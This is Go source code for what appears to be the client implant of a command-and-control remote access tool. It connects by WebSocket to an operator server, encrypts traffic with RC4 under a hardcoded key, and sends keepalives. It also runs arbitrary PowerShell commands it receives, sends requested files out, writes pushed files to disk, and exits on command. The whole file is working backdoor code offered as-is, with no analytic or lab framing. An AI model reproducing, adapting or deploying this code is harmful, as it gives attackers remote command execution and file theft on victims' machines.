package main

import (
	"crypto/rc4"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var serverAddr = flag.String("addr", "localhost:8080", "server address")

func connectToServer(serverAddr string) *websocket.Conn {
	u := url.URL{Scheme: "ws", Host: serverAddr, Path: "/ws"}
	log.Printf("Connecting to %s...", u.String())

	// Connect to the server over a WebSocket
	ws, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}

	return ws
}

func encrypt(data []byte) []byte {
	// RC4 encrypt with hardcoded shared key
	key := []byte("n1ss3b4nd3ns_n1ss3w4r3")
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}

	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

func send(ws *websocket.Conn, data []byte) {
	encrypted := encrypt(data)
	err := ws.WriteMessage(websocket.TextMessage, []byte(encrypted))
	if err != nil {
		log.Fatal(err)
	}
}

func receive(ws *websocket.Conn) []byte {
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Fatal(err)
	}
	return encrypt(message)
}

func readFile(path string) ([]byte, error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("file does not exist")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("file could not be read")
	}

	return data, nil
}

func writeFile(path string, data []byte) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(data)
	if err != nil {
		return err
	}

	return nil
}

func do_cmd(ws *websocket.Conn) {
	cmd := string(receive(ws))
	log.Printf("Command received: %s\n", cmd)
	result, err := exec.Command("powershell", "-NoProfile", cmd).CombinedOutput()
	if err != nil {
		log.Printf("Command execution error: %s\n", err)
		send(ws, []byte{1})
		send(ws, []byte(err.Error()))
	} else {
		log.Printf("Command output: %s\n", result)
		send(ws, []byte{0})
		send(ws, []byte(result))
	}
}

func do_upload(ws *websocket.Conn) {
	path := string(receive(ws))
	file, err := readFile(path)
	if err != nil {
		log.Printf("File error: %s\n", err)
		send(ws, []byte{1})
		send(ws, []byte(err.Error()))
	} else {
		log.Printf("Uploading file %s...\n", path)
		send(ws, []byte{0})
		send(ws, file)
		log.Println("File uploaded")
	}
}

func do_download(ws *websocket.Conn) {
	path := string(receive(ws))
	data := receive(ws)
	err := writeFile(path, data)
	if err != nil {
		log.Printf("File error: %s\n", err)
		send(ws, []byte{1})
		send(ws, []byte(err.Error()))
	} else {
		send(ws, []byte{0})
		send(ws, []byte("File download successful"))
		log.Println("File downloaded and saved")
	}
}

func do_kill(ws *websocket.Conn) {
	log.Println("Killing client...")
	os.Exit(0)
}

func main() {
	flag.Parse()
	log.SetFlags(0)

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	ws := connectToServer(*serverAddr)
	defer ws.Close()
	id := uuid.New().String()
	log.Printf("Generated ID %s\n", id)

	send(ws, []byte(id))
	ack := string(receive(ws))
	log.Println(ack)
	if ack != fmt.Sprint("ack ", id) {
		log.Fatal("ID doesn't match, closing...")
	}

	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			message := receive(ws)
			log.Printf("Action: %s\n", message)

			switch string(message) {
			case "cmd":
				do_cmd(ws)
			case "upload":
				do_upload(ws)
			case "download":
				do_download(ws)
			case "kill":
				do_kill(ws)
			default:
				log.Println("Invalid action")
			}
			log.Println()
		}
	}()

	ticker := time.NewTicker(time.Second * 60 * 5)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			send(ws, []byte("alive"))
		case <-interrupt:
			log.Println("interrupt")

			// Cleanly close the connection by sending a close message and then
			// waiting (with timeout) for the server to close the connection.
			err := ws.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("write close:", err)
				return
			}
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
